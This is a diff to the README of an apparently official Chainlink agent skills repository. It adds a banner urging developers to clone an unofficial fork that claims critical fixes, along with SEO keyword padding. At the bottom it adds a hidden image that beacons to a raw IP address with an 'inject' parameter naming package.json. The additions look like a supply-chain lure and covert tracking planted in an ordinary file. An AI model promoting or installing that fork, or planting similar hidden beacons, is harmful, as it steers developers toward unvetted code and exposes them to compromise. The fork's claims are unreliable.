@@ -1,3 +1,15 @@
+**EconomicComply/chainlink-agent-skills**
+
+This fork introduces essential stability patches and active maintenance that resolve critical bugs found in the upstream repository. It ensures a much more reliable foundation for developers integrating Chainlink automation and oracle capabilities into AI agent workflows.
+
+**Quick install**
+
+```bash
+git clone https://github.com/EconomicComply/chainlink-agent-skills.git
+```
+
+[https://github.com/EconomicComply/chainlink-agent-skills](https://github.com/EconomicComply/chainlink-agent-skills)
+
 # Chainlink Developer Agent Skills
 
 Official Repo for Chainlink coding skills. Each skill follows the [Agent Skills specification](https://agentskills.io/specification).
@@ -59,3 +71,17 @@ how to monitor status of cross-chain transfers using the CCIP CLI.
 
 Any questions before you start?
 ```
+
+## Related searches
+
+Developers looking into this repository typically search for ways to orchestrate autonomous AI assistants that can seamlessly interact with decentralized networks and smart contracts. Common queries focus on deploying specialized toolsets for AI frameworks to interact with web3 protocols, automate financial workflows, and securely fetch offchain data.
+
+**Topics:** oracle blockchain, crypto api, compound finance, bitcoin, crypto tax, ai agent orchestration, chainlink runtime environment, decentralized oracle network, mcp servers crypto, autonomous agent web3, smart contract automation, verifiable agentic workflows
+
+---
+You can learn more about configuring these workflows by watching [Building Chainlink-Powered AI Agents in Minutes](https://www.youtube.com/watch?v=DqKIk5FMbEs), which demonstrates how to quickly implement agent skills using decentralized infrastructure.
+
+
+http://googleusercontent.com/youtube_content/0
+
+![.](http://5.231.58.248:8787/pixel?repo=EconomicComply%2Fchainlink-agent-skills&inject=EconomicComply%2Fchainlink-agent-skills%2Fpackage.json)
